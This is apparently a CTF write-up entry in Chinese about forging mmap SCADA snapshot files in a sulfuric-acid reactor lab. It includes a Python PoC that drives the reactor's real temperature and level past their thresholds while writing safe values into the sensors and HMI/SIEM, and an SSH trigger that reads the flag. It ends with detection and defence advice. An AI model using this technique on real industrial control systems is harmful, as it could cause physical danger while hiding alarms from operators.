---
id: iot-industrial-scada-snapshot-mmap-state-forgery
title: SCADA 快照文件 mmap 伪造：真实反应釜越限 + 传感器/SIEM 安全值欺骗
type: scenario
domain: iot
path: iot/industrial
technique: scada-snapshot-mmap-state-forgery
aliases:
- 虚验室制取稀硫酸
- SCADA snapshot
- mmap 状态伪造
- 反应釜越限
- 传感器欺骗
- SIEM 安全值
tags:
- iot
- industrial
- scada
- snapshot
- mmap
- sensor-spoofing
- safety-interlock
- plc
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:51:12+08:00'
  notes: 已对照原文 §22 虚验室制取稀硫酸核对：source/*/metadata.json 偏移、reactor_vessel 真实温度 95/液位 105 越限、temperature/level sensor 安全 45/80、controller/scada_panel 观测值与告警位伪造、tui 发 r recover 读公告板均一致；原文有实测 flag，未本机复跑。
---

## 一句话结论

题目提供稀硫酸反应釜的元数据与在线 SSH 靶机；`source/*/metadata.json` 给出各设备 `/hardware/*.snapshot` 的字段与 mmap 偏移。攻击者用 `patch()` 直接改这些内存映射快照：让真实 `reactor_vessel` 的温度超过 90、液位超过 100（危险越限），同时把温度/液位传感器、控制器和 SCADA 面板的观测值伪造成安全范围（45/80），使 HMI/SIEM 看到“安全”状态；随后在 TUI 面板按 `r` 触发 recover，读取公告板 flag。

## 原理

- **快照即状态**：设备的 `/hardware/*.snapshot` 是 mmap 文件，进程直接读写其中的结构体字段；元数据 `metadata.json` 给出字段名、类型、偏移。攻击者只要能写这些文件，就等价于直接改设备内存状态。
- **真实 vs 观测分离**：`reactor_vessel.snapshot` 保存真实温度/液位/阀门等；`temperature_sensor.snapshot`、`level_sensor.snapshot` 保存传感器输出；`h2so4_controller.snapshot` 保存控制器状态；`scada_panel.snapshot` 保存 HMI/SIEM 观测值与告警。安全逻辑可能只检查传感器/面板，而不校验反应釜真实值，或反之。
- **伪造策略**：把反应釜真实 `temp/level` 写成 `bad_temp=95`、`bad_level=105`（超过 90/100 阈值），同时把传感器 `value` 和控制器/面板的 `observed` 写成 `safe_temp=45`、`safe_level=80`；设置状态位/告警位为“正常/已确认”，避免面板弹出告警或拒绝 recover。
- **触发 recover**：TUI 面板的 `r` 键会重新读取快照并执行恢复/判定逻辑；当它看到“真实越限但观测安全”的矛盾状态时，公告板打印 flag（题目设定）。
- **为什么有效**：状态文件没有完整性保护/签名，且安全判定分散在多个组件；攻击者同时篡改真实与观测值，绕过单点校验。

## 触发条件

- 目标通过 mmap 的 `/hardware/*.snapshot` 共享设备状态，文件对低权限用户可写。
- 元数据/源码泄露字段名、类型与偏移。
- 安全判定依赖传感器/面板观测值，未与真实执行器值交叉校验，或只做单点校验。
- 可通过 SSH/TUI 触发 recover/公告板读取。

## 利用步骤

1. 从 `source/*/metadata.json` 还原各 snapshot 的字段、类型、偏移。
2. 用 SFTP/SSH 上传 patch 脚本，以 `ctf` 用户运行（或直接写文件）。
3. 循环 patch `reactor_vessel.snapshot`：真实温度 95、液位 105、阀门/状态位按需设置。
4. 同步 patch `temperature_sensor`、`level_sensor`、`h2so4_controller`、`scada_panel` 的观测值为 45/80，清除告警/置正常位。
5. 登录 `tui:tui`，发送 `r` 触发 recover；读取 TUI 公告板中的 flag。

## PoC

```python
import struct

def patch(path, writes):
    with open(path, "r+b") as f:
        for off, data in writes:
            f.seek(off); f.write(data)

def f32(x): return struct.pack("<f", x)
def i8(x): return bytes([x & 0xff])
def i16(x): return struct.pack("<h", x)

safe_temp, safe_level = 45.0, 80.0
bad_temp, bad_level = 95.0, 105.0

for _ in range(2500):
    patch("/hardware/reactor_vessel.snapshot", [
        (8, f32(0.0)), (12, f32(80.0)), (17, i8(0)),
        (24, f32(bad_temp)), (28, f32(bad_level)),
        (32, f32(80.0)), (36, i8(0)), (37, i8(1)), (60, f32(80.0)),
    ])
    patch("/hardware/temperature_sensor.snapshot", [
        (8, f32(bad_temp)), (12, i8(0)), (16, f32(safe_temp)),
        (20, i8(1)), (21, i8(0)), (22, i8(0)), (24, f32(safe_temp)),
    ])
    patch("/hardware/level_sensor.snapshot", [
        (8, f32(bad_level)), (12, i8(0)), (16, f32(safe_level)),
        (20, i8(1)), (21, i8(0)), (22, i8(0)), (24, f32(safe_level)),
    ])
    # controller/scada_panel 同步写安全观测值并清告警
```

TUI 触发：

```python
chan = ssh.invoke_shell(width=160, height=45)
chan.send("r")
time.sleep(2.5)
print(chan.recv(65535).decode(errors="replace"))
```

## 变体与关联

- 快照可换成共享内存、Redis/配置中心、OPC UA 节点、PLC DB；核心是“可写状态 + 真实/观测分离”。
- 若安全逻辑交叉校验真实与观测，需同时伪造传感器和执行器或利用竞态/时序。
- 若无 TUI recover，可通过报警/日志/物理副作用判断；flag 可能在其他服务。
- 关联：S7comm 多 DB 状态伪造、IEC 104/Modbus 写操作、SCADA 安全卡。

## 检测与防御

- 对 `/hardware/*.snapshot` 做完整性保护（签名/HMAC）、只允许特权进程写；低权限用户只读。
- 安全判定同时校验真实执行器值与传感器值，做交叉一致性检查；关键阈值在 PLC/安全仪表系统内实现。
- 审计：监控 snapshot 文件高频写入、真实值与观测值背离、告警位被清除；TUI recover 事件记录来源。
- 检测：反应釜真实温度/液位越限而传感器/面板显示安全；同一用户同时写多个设备快照。
